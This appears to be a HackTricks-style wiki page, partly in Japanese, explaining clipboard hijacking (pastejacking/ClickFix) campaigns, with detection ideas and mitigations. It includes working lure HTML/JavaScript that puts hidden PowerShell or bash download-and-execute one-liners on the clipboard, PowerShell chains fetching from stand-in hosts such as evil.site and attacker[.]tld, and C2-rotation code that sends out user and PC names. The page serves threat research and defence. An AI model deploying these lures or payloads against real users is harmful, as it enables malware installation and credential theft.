# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "自分でコピーしていないものを貼り付けるな。" – 古くても今も有効な助言

## 概要

Clipboard hijacking – also known as *pastejacking* – は、ユーザーがコマンドを確認せずにコピー＆ペーストすることを悪用します。悪意のあるウェブページ（または Electron や Desktop アプリのような JavaScript 実行可能なコンテキスト）は、攻撃者が制御するテキストをプログラムでシステムのクリップボードに置きます。被害者は通常、巧妙に作られたソーシャルエンジニアリングの指示により、**Win + R**（Run dialog）、**Win + X**（Quick Access / PowerShell）を押すか端末を開いてクリップボードの内容を*paste*し、即座に任意のコマンドが実行されます。

**ファイルがダウンロードされず、添付ファイルが開かれないため**、この手法は添付ファイル、マクロ、あるいは直接的なコマンド実行を監視する多くのメール／ウェブコンテンツのセキュリティ制御を回避します。したがって、この攻撃は NetSupport RAT、Latrodectus loader、Lumma Stealer といった一般的なマルウェアを配布するフィッシングキャンペーンでよく利用されます。

## 強制コピーボタンと隠れたペイロード（macOS one-liners）

一部の macOS 向け infostealer はインストーラサイト（例: Homebrew）をクローンし、ユーザーが表示テキストだけを選択できないように **“Copy” ボタンの使用を強制します**。クリップボードには期待通りのインストーラコマンドに加えて Base64 ペイロードが追記されて格納されます（例: `...; echo <b64> | base64 -d | sh`）。そのため、一度の貼り付けで両方が実行され、UI はこの余分な段階を隠します。

## JavaScript 概念実証
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## ClickFix / ClearFake のフロー

1. ユーザーがタイポスクワットされたか侵害されたサイトを訪問する（例: `docusign.sa[.]com`）
2. 注入された **ClearFake** JavaScript は `unsecuredCopyToClipboard()` ヘルパーを呼び出し、Base64 でエンコードされた PowerShell のワンライナーをクリップボードに密かに格納する。
3. HTML の指示は被害者にこう伝える: *「**Win + R** を押し、コマンドを貼り付けて Enter を押して問題を解決してください。」*
4. `powershell.exe` が実行され、正規の実行ファイルと悪意のある DLL を含むアーカイブをダウンロードする（古典的な DLL sideloading）。
5. ローダーは追加のステージを復号し、shellcode を注入して永続化（例: scheduled task）を行い、最終的に NetSupport RAT / Latrodectus / Lumma Stealer を実行する。

### NetSupport RAT チェーンの例
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe`（正当な Java WebStart）は自身のディレクトリ内で `msvcp140.dll` を検索します。
* 悪意のある DLL は **GetProcAddress** を用いて API を動的に解決し、**curl.exe** を介して 2 つのバイナリ (`data_3.bin`, `data_4.bin`) をダウンロードし、rolling XOR key `"https://google.com/"` を使ってそれらを復号し、最終的な shellcode を注入して **client32.exe**（NetSupport RAT）を `C:\ProgramData\SecurityCheck_v1\` に解凍します。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** で `la.txt` をダウンロードする
2. **cscript.exe** 内で JScript downloader を実行する
3. MSI payload を取得 → 署名済みアプリケーションの横に `libcef.dll` をドロップ → DLL sideloading → shellcode → Latrodectus。

### MSHTA 経由の Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Some ClickFix campaigns skip file downloads entirely and instruct victims to paste a one‑liner that fetches and executes JavaScript via WSH, persists it, and rotates C2 daily. Example observed chain:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
主な特徴
- カジュアルな検査を回避するため、実行時に逆順にされた難読化された URL。
- JavaScript は Startup LNK (WScript/CScript) を介して自身を永続化し、当日の日付で C2 を選択することで迅速なドメイン回転を可能にする。

日付で C2 をローテーションするために使用される最小限の JS フラグメント:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Next stage commonly deploys a loader that establishes persistence and pulls a RAT (e.g., PureHVNC), often pinning TLS to a hardcoded certificate and chunking traffic.

Detection ideas specific to this variant
- プロセスツリー: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- スタートアップの痕跡: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` に置かれた LNK が WScript/CScript を呼び出し、JS パスが `%TEMP%`/`%APPDATA%` 下にある。
- Registry/RunMRU やコマンドラインのテレメトリに `.split('').reverse().join('')` や `eval(a.responseText)` を含むエントリ。
- 長いコマンドラインを避けるために大きな stdin ペイロードで長いスクリプトを流し込む、`powershell -NoProfile -NonInteractive -Command -` の繰り返し。
- その後 LOLBins を実行する Scheduled Tasks（例: updater 風のタスク/パス下で `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` を実行） (例: `\GoogleSystem\GoogleUpdater`)。

Threat hunting
- `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` パターンを持つ日次でローテーションする C2 ホスト名/URL。
- clipboard 書き込みイベントに続き Win+R 貼り付け、その直後に `powershell.exe` が実行される挙動を相関させる。

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` は **Win + R** コマンドの履歴を保持します – 不審な Base64 / 難読化されたエントリを探してください。
* Security Event ID **4688** (Process Creation) で `ParentImage` == `explorer.exe` かつ `NewProcessName` が { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } に含まれる場合を注視。
* Event ID **4663**: 疑わしい 4688 イベント直前に `%LocalAppData%\Microsoft\Windows\WinX\` や一時フォルダでファイルが作成されているか確認。
* EDR clipboard sensors (if present) – `Clipboard Write` が発生し、その直後に新しい PowerShell プロセスが立ち上がることを相関。

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

最近のキャンペーンでは偽の CDN/browser 検証ページ（"Just a moment…", IUAM-style）を大量生産し、ユーザに clipboard から OS 固有のコマンドをネイティブコンソールにコピーさせることでブラウザのサンドボックス外で実行させます。これにより Windows と macOS 両方で動作します。

Key traits of the builder-generated pages
- `navigator.userAgent` による OS 検出でペイロードを最適化（Windows PowerShell/CMD vs. macOS Terminal）。サポート外の OS にはデコイ/無操作を入れて欺瞞を維持。
- ユーザの benign UI アクション（checkbox/Copy）で自動的に clipboard にコピーされるが、表示されているテキストと clipboard の内容が異なる場合がある。
- モバイルブロックと手順ポップオーバー: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter。
- 任意の難読化と単一ファイルのインジェクタで、侵害されたサイトの DOM を Tailwind スタイルの検証 UI に上書き（新規ドメイン登録不要）。

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS 初回実行の永続化
- 端末が閉じた後も実行が継続するように、`nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` を使用し、目に見える痕跡を減らす。

侵害されたサイト上での In-place page takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Pages that bind Clipboard API to verification widgets; mismatch between displayed text and clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace in suspicious contexts.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` shortly after a browser interaction; batch/MSI installers executed from `%TEMP%`.
- macOS endpoint: Terminal/iTerm spawning `bash`/`curl`/`base64 -d` with `nohup` near browser events; background jobs surviving terminal close.
- Correlate `RunMRU` Win+R history and clipboard writes with subsequent console process creation.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
